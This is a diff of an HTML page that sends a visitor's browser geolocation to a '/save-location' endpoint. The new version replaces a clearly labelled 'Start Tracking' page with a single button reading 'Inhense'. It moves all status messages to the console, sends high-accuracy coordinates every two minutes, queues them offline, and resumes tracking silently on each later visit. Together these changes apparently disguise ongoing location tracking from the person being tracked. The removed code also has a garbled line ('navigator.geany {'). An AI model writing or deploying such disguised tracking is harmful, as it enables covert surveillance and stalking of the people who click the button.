@@ -1,74 +1,137 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="hi">
 <head>
   <meta charset="UTF-8" />
-  <title>Live Location</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Live Location Tracker</title>
   <style>
+    * { box-sizing: border-box; }
     body {
-      font-family: Arial;
-      text-align: center;
-      margin-top: 100px;
-      background: #f4f4f4;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      background: #ffffff;
     }
-    button {
-      padding: 15px 30px;
+    #inhenseBtn {
+      padding: 10px 24px;
       font-size: 18px;
-      border: none;
-      border-radius: 8px;
-      background: green;
-      color: white;
       cursor: pointer;
+    }
+    #inhenseBtn:disabled {
+      cursor: not-allowed;
+      opacity: 0.6;
     }
   </style>
 </head>
 <body>
+  <button id="inhenseBtn">Inhense</button>
 
-  <h1>📍 Live Location Sender</h1>
-  <button onclick="startTracking()">Start Tracking</button>
-  <p id="status"></p>
+  <script>
+    const BACKEND_URL = "/save-location"; // relative path for same domain
+    const TWO_MIN = 2 * 60 * 1000;
+    const btn = document.getElementById("inhenseBtn");
 
-<script>
-let intervalId;
+    let trackingIntervalId = null;
+    let trackingStarted = false;
 
-function startTracking() {
-  sendLocation();
-  intervalId = setInterval(sendLocation, 60000); // every 1 minute
-}
-
-function sendLocation() {
-  const status = document.getElementById("status");
-
-  if (!navigator.geany {
-    status.innerText = "Geolocation not supported";
-    return;
-  }
-
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const data = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude
-      };
-
-      try {
-        const res = await fetch("/save-location", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify(data)
-        });
-
-        const result = await res.json();
-        status.innerText = "✅ Location sent at " + new Date().toLocaleTimeString();
-      } catch (e) {
-        status.innerText = "❌ Server error";
+    async function sendLocation() {
+      if (!navigator.geolocation) {
+        console.log("❌ Geolocation supported nahi hai.");
+        return;
       }
-    },
-    () => {
-      status.innerText = "❌ Location permission denied";
-    }
-  );
-}
-</script>
 
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const data = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            timestamp: new Date().toISOString(),
+          };
+
+          console.log("📤 Location backend ko bheji gayi:", new Date().toLocaleTimeString());
+
+          try {
+            const res = await fetch(BACKEND_URL, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data),
+            });
+            const json = await res.json();
+            if (!json.success) console.log("❌ Server error while saving location");
+          } catch (err) {
+            console.log("❌ Backend error, saving locally");
+            let pending = JSON.parse(localStorage.getItem("pendingLocations") || "[]");
+            pending.push(data);
+            localStorage.setItem("pendingLocations", JSON.stringify(pending));
+          }
+        },
+        (err) => {
+          console.log("❌ Error getting location:", err.message);
+        },
+        { enableHighAccuracy: true }
+      );
+    }
+
+    async function sendPendingLocations() {
+      let pending = JSON.parse(localStorage.getItem("pendingLocations") || "[]");
+      if (pending.length === 0) return;
+
+      console.log("🔁 Pending locations bhejne ki koshish, count:", pending.length);
+
+      for (let loc of pending) {
+        try {
+          const res = await fetch(BACKEND_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(loc),
+          });
+          const json = await res.json();
+          if (!json.success) return;
+        } catch (err) {
+          return;
+        }
+      }
+
+      localStorage.removeItem("pendingLocations");
+      console.log("✅ Saari pending locations send ho gayi.");
+    }
+
+    async function startTracking() {
+      if (trackingStarted) return;
+      trackingStarted = true;
+
+      localStorage.setItem("trackingStarted", "true");
+
+      btn.disabled = true;
+      btn.textContent = "Tracking active";
+
+      await sendLocation();
+      await sendPendingLocations();
+
+      trackingIntervalId = setInterval(() => {
+        sendLocation();
+        sendPendingLocations();
+      }, TWO_MIN);
+    }
+
+    btn.addEventListener("click", () => startTracking());
+
+    window.addEventListener("load", () => {
+      const wasStarted = localStorage.getItem("trackingStarted") === "true";
+      if (wasStarted) {
+        btn.disabled = true;
+        btn.textContent = "Tracking active";
+        startTracking();
+      }
+    });
+
+    window.addEventListener("online", () => {
+      console.log("🌐 Back online:", new Date().toLocaleTimeString());
+      sendPendingLocations();
+    });
+  </script>
 </body>
 </html>
